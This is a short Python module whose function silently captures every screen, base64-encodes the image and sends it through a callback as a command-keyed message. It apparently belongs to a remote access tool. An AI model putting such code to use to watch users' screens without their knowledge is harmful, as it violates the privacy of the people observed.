from typing import Callable
import random
import base64
import pyautogui
import json
import os

def screenshare(send: Callable[[str], None]) -> None:
  try:
      screenshot = pyautogui.screenshot(allScreens=True)
      file_name = f"{random.randint(111111, 444444)}.png"
      screenshot.save(file_name)

      with open(file_name, "rb") as img_file:
          image_bytes = img_file.read()
          encoded_image = base64.b64encode(image_bytes).decode('utf-8')

      send(json.dumps({
          "command": "ss",
          "screenshot": encoded_image
      }))

      os.remove(file_name)
  except Exception as e:
      print(f"Error taking screenshot: {e}")
